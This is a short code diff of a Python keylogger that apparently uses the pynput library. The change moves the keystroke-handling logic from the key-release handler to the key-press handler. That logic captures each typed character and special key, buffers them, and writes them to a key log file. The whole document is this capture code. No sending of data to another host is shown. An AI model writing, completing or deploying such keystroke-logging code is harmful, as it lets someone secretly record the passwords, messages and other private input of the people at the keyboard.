@@ -16,17 +16,16 @@ def save_in_key_log_file(combined_letter_in_list, with_whitespace=False):
         file.write(combined_letter_in_list)
         if with_whitespace:
             file.write("\n")   
-            
+
 def on_press(key):
-    pass
-    
-def on_release(key):
     buttkey = keyboard.Key
     with_whitespace = True
+
     if hasattr(key, 'char') and key.char:
         key_str = key.char
     else:
         key_str = str(key)
+
     if key in (buttkey.backspace, buttkey.space, buttkey.enter, buttkey.esc, buttkey.cmd):
         if key == buttkey.space:
             key_str = " "
@@ -41,6 +40,9 @@ def on_release(key):
         key_buffer.clear()
     else:
         key_buffer.append(key_str)
+    
+def on_release(key):
+    pass
 
 listener = keyboard.Listener(
     on_press=on_press,
